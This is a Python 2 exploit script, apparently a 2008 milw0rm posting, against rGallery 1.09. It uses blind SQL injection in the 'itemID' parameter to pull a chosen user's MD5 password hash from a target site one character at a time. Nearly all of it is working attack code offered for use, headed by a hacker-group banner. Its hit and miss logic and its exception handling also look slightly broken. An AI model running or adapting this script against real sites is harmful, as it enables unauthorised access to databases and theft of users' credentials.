import sys, urllib2, re

print "\n "
print "                          \\#'#/                        "
print "                          (-.-)                         "
print "  -------------------oOO---(_)---OOo--------------------"
print "  |   rGallery 1.09 (+-) Exploit by Five-Three-Nine    |"
print "  |  Using Blind SQL Injection in 'itemID' of rGallery |"
print "  |                                                    |"
print "  |                Greets and Shouts to:               |"
print "  | tmh, n00bor, activebeta, Ghost, Saufkumpel, Altair |"
print "  | crusader727, Nemo, Loader007, J0hn.X3r, sNiper109  |"
print "  ------------------------------------------------------\n"


if len(sys.argv) != 5:
	print "\nUsage: ./rGallery.py <UserID> <UserTable> <ImageID> <site>"
	print "Ex: ./rGallery.py 1 bb1_users 19 http://example.com\n"
	sys.exit(1)

UserID = sys.argv[1]
Prefix = sys.argv[2]
ImageID = sys.argv[3]
Host = sys.argv[4]

Res = [48,49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102]
MD5 = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32]
Hash = ""

UserID = int(UserID)
UserID -= 1
UserID = str(UserID)

for MD5Count in range(32):
	for ResCount in range(16):
		try:
			source = urllib2.urlopen(Host +"/index.php?page=RGalleryImageWrapper&itemID=" + ImageID +"%20and%20ascii(substring((SELECT%20password%20from%20" + Prefix +"%20limit%20"+ UserID + ",1)," + str(MD5Count + 1) + ",1))="+ str(Res[ResCount])).read()

			print "[+] Character " + str(MD5Count + 1) +  " found! " + str(Res[ResCount])
			MD5[MD5Count] = Res[ResCount]
			break
		except(urllib2.URLError):
			continue
		except(urllib2.HTTPError):
			print "[+] Error: Can't load the Site"
			sys.exit(1)


for i in MD5:
	Hash = Hash + str(chr(i))

print "\n[+] Hash: " + Hash

# milw0rm.com [2008-10-20]